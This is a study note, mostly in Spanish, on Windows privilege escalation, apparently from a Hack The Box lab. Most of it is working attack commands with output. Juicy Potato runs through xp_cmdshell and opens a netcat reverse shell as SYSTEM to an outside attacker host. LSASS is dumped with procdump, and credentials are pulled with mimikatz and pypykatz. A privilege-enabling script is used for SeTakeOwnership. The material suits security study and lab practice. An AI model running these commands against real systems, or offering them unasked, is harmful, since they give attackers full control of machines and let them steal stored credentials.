# Windows Privilege Escalation

## Useful tools
| Tool                                       | Description                                                                                                                                                                                                                                         |
|--------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Seatbelt                                   | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                      |
| winPEAS                                    | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here                                                                                                                  |
| PowerUp                                    | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                   |
| SharpUp                                    | C# version of PowerUp                                                                                                                                                                                                                              |
| JAWS                                       | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                           |
| SessionGopher                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                   |
| Watson                                     | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                              |
| LaZagne                                    | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more       |
| Windows Exploit Suggester - Next Generation | WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10 is supported |
| Sysinternals Suite                         | We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService                                                                                                                                         |

- [Payload all the things Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [More Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

## SeImpersonate and SeAssignPrimaryToken
### SeImpersonate example - Juicy Potato

- Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeImpersonate..
- Podemos utilizar juicypotato para conseguir un token de servicio con el privilegio SeImpersonate.
    - Juicy potato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.
    - https://github.com/ohpe/juicy-potato
- Explota privilegios via DCOM/NTLM (SeImpersonate).
- `JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`
    - explicación del comando:
        - `-l 53375` es el puerto que se va a utilizar para la comunicación.
        - `-p c:\windows\system32\cmd.exe` es la ruta de la binary que se va a ejecutar.
        - `-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` es la argumento que se va a pasar a la binary que se va a ejecutar.
        - `-t *` es el token de servicio que se va a utilizar.
### Rogue Potato
- RoguePotato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.
```PowerShell
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.195 8443 -e cmd.exe" -t *
output                                                       
----------------------------------------------------------   
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         

......                                                       

[+] authresult 0                                             

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   

NULL                                                         

[+] CreateProcessWithTokenW OK                               

[+] calling 0x000000000088ce08                               

NULL                                                         

SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
```
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.14.195] from (UNKNOWN) [10.129.43.43] 49686
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

``` 

## SeDebugPrivilege
- Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeDebugPrivilege.
- Podemos usar ProcDump de Sysinternals para conseguir un un dump de memoria LSASS.
- `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
    - Ahora con esto podemos usar pypykatz en nuestra maquina atacante, o mimikatz en la maquina victima para obtener las credenciales de los servicios.
```
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```
- `pypykatz lsa minidump 'lsass (1).dmp'`
- De todas formas siempre podemos dumpear a mano con el task manager.
- ![](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)
### RCE con SeDebugPrivilege
- Se pueden elevar los privilegios ejecutando un proceso hijo con privilegios eleveados heredando los privilegios de un proceso padre.
- Podemos utilizar el [siguiente script](https://github.com/decoder-it/psgetsystem)
    - `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

## SeTakeOwnerPrivilege
- Este privilegio permite la habilidad de tomar ownership de cualquier objeto.
    - NTFS, Registry, File, Process, Thread, Semaphore, Mutex, Desktop, Window Station, Message Queue, Job, and Section.
- Este privilegio asigna permisos WRITE_OWNER para el objeto especificado.
- Se puede intentar habilitar este privilegio usando [el siguieunte script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
